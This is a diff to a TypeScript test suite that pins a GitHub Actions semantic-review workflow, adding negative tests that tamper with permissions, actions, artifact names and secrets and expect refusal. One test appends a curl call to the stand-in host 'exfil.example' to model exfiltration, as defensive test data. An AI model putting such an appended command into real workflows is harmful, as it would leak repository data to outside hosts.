@@ -356,13 +356,18 @@ const PATHS_FILTER_VERDICT_ENV: ReadonlyArray<readonly [string, string]> = [
     ['WEB', 'web'],
     ['UNCLASSIFIED', 'unclassified'],
 ];
-// The one continue-on-error the lane admits. The first filter attempt defers
+// The two continue-on-errors the lane admits. The first filter attempt defers
 // to the retry that re-runs it, and `Resolve scope` fails the job when neither
 // attempt produced verdicts, so this softening defers to a louder failure
-// rather than swallowing one.
+// rather than swallowing one. The semantic coverage fetch is the second: a
+// missing artifact is the expected shape of a run whose assessment never
+// delivered, and the annotating step reports that absence itself, so softening
+// the fetch replaces a red download with an explicit notice rather than hiding
+// a proof.
 type SoftenedStepPin = Readonly<{ workflow: string; job: string; step: string }>;
 const CONTINUE_ON_ERROR_STEP_PINS: readonly SoftenedStepPin[] = [
     { workflow: 'validation.yml', job: 'decide', step: PATHS_FILTER_FIRST_ATTEMPT_STEP },
+    { workflow: 'semantic-review.yml', job: 'coverage', step: 'Download the advisory report' },
 ];
 // A softened shard step reports a failing suite as a passing required check.
 const SUITE_SHARD_STEP = 'Run shard';
@@ -1966,11 +1971,11 @@ describe('health gates workflow contract', () => {
             expect(label).not.toBe('');
         }
 
-        // A fifth step that runs anything at all is unpinned, and that is a refusal rather than a
+        // A sixth step that runs anything at all is unpinned, and that is a refusal rather than a
         // silently accepted addition.
         const extraRunner = structuredClone(semanticReviewWorkflow);
         stepNamed(jobAt(extraRunner, 'assess'), 'Set up Node').run = 'echo hello';
-        expect(() => assertSemanticReviewWorkflow(extraRunner)).toThrow('exactly four executable steps');
+        expect(() => assertSemanticReviewWorkflow(extraRunner)).toThrow('exactly five executable steps');
 
         // A run supplied as a YAML sequence has the same effect and a different shape, and is refused
         // as not being the pinned string.
@@ -2058,6 +2063,109 @@ describe('health gates workflow contract', () => {
         const renamed = structuredClone(semanticReviewWorkflow);
         jobAt(renamed, 'assess').name = 'Gate';
         expect(() => assertSemanticReviewWorkflow(renamed)).toThrow('its distinct advisory check name');
+
+        // The coverage job is informational, so a write token beside it buys
+        // nothing; `checks: write` is the tempting addition and is refused.
+        const coverageWrites = structuredClone(semanticReviewWorkflow);
+        recordAt(jobAt(coverageWrites, 'coverage'), 'permissions').checks = 'write';
+        expect(() => assertSemanticReviewWorkflow(coverageWrites)).toThrow('contents: read alone');
+
+        // The coverage job reads the run's artifact and nothing else. A
+        // checkout — even the trusted revision's — is an action this job must
+        // not hold, and an unpinned downloader is the same supply-chain surface
+        // the assessment job's action list refuses.
+        for (const [label, uses] of [
+            ['a checkout', 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'],
+            ['an unpinned download', 'actions/download-artifact@main'],
+        ] as const) {
+            const wrongAction = structuredClone(semanticReviewWorkflow);
+            stepNamed(jobAt(wrongAction, 'coverage'), 'Download the advisory report').uses = uses;
+            expect(
+                () => assertSemanticReviewWorkflow(wrongAction),
+                `${label} in the coverage job must be refused`
+            ).toThrow('the one pinned action, and no checkout');
+        }
+
+        // The artifact name is what binds the read to this run's own upload; a
+        // widened name can pick up another pull request's report.
+        const widenedArtifact = structuredClone(semanticReviewWorkflow);
+        recordAt(stepNamed(jobAt(widenedArtifact, 'coverage'), 'Download the advisory report'), 'with').name =
+            'semantic-review';
+        expect(() => assertSemanticReviewWorkflow(widenedArtifact)).toThrow('the artifact this run uploaded');
+
+        // A missing artifact is an expected outcome, so the fetch is softened
+        // and the annotating step reports it. Hardening the fetch back turns
+        // that outcome into a red coverage job that says nothing.
+        const hardenedDownload = structuredClone(semanticReviewWorkflow);
+        delete stepNamed(jobAt(hardenedDownload, 'coverage'), 'Download the advisory report')['continue-on-error'];
+        expect(() => assertSemanticReviewWorkflow(hardenedDownload)).toThrow('the softened artifact fetch');
+
+        // A static coverage name reports a check that no longer says anything
+        // about this run's scope, which is the whole product of the job.
+        const staticCoverageName = structuredClone(semanticReviewWorkflow);
+        jobAt(staticCoverageName, 'coverage').name = 'Jev coverage';
+        expect(() => assertSemanticReviewWorkflow(staticCoverageName)).toThrow(
+            'a coverage name built from the assessment output'
+        );
+
+        // Without the dependency the coverage job reads a run that may not
+        // exist, and without the output its name has nothing to carry.
+        const disconnectedCoverage = structuredClone(semanticReviewWorkflow);
+        delete jobAt(disconnectedCoverage, 'coverage').needs;
+        expect(() => assertSemanticReviewWorkflow(disconnectedCoverage)).toThrow('its dependency on the assessment');
+
+        const alwaysCoverage = structuredClone(semanticReviewWorkflow);
+        jobAt(alwaysCoverage, 'coverage').if = 'always()';
+        expect(() => assertSemanticReviewWorkflow(alwaysCoverage)).toThrow('its run-unless-cancelled condition');
+
+        const outputless = structuredClone(semanticReviewWorkflow);
+        delete jobAt(outputless, 'assess').outputs;
+        expect(() => assertSemanticReviewWorkflow(outputless)).toThrow('its single coverage output');
+
+        // The computing step must run on a red assessment too: deleting or
+        // widening its condition is the same empty name one step earlier.
+        for (const [label, condition] of [
+            ['a dropped condition', undefined],
+            ['a widened condition', 'always()'],
+        ] as const) {
+            const gatedCoverage = structuredClone(semanticReviewWorkflow);
+            const compute = stepNamed(jobAt(gatedCoverage, 'assess'), 'Compute the coverage line');
+            if (condition === undefined) {
+                delete compute.if;
+            } else {
+                compute.if = condition;
+            }
+            expect(
+                () => assertSemanticReviewWorkflow(gatedCoverage),
+                `${label} on the computing step must be refused`
+            ).toThrow('no step condition beyond the job gate');
+        }
+
+        // The output is read through the step id, so an id that drifts leaves
+        // the job output empty while the step still runs.
+        const wrongId = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(wrongId, 'assess'), 'Compute the coverage line').id = 'line';
+        expect(() => assertSemanticReviewWorkflow(wrongId)).toThrow('the output id its own output is read from');
+
+        // The annotating step was pinned by command, so any appended command
+        // would keep the check name and stop it meaning what it says.
+        const exfiltratingCoverage = structuredClone(semanticReviewWorkflow);
+        const annotate = stepNamed(jobAt(exfiltratingCoverage, 'coverage'), 'Publish the withheld paths');
+        annotate.run = `${String(annotate.run)}curl -s "https://exfil.example"`;
+        expect(() => assertSemanticReviewWorkflow(exfiltratingCoverage)).toThrow(
+            'exactly the pinned annotating command'
+        );
+
+        // The provider key is scoped to the assessment step alone, so the same
+        // credential on the coverage job is refused by the workflow-wide count
+        // however the variable is named.
+        const keyInCoverage = structuredClone(semanticReviewWorkflow);
+        stepNamed(jobAt(keyInCoverage, 'coverage'), 'Publish the withheld paths').env = {
+            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
+        };
+        expect(() => assertSemanticReviewWorkflow(keyInCoverage)).toThrow(
+            'must mention a repository secret exactly once, on the assessment step'
+        );
     });
     afterEach(() => {
         vi.unstubAllGlobals();
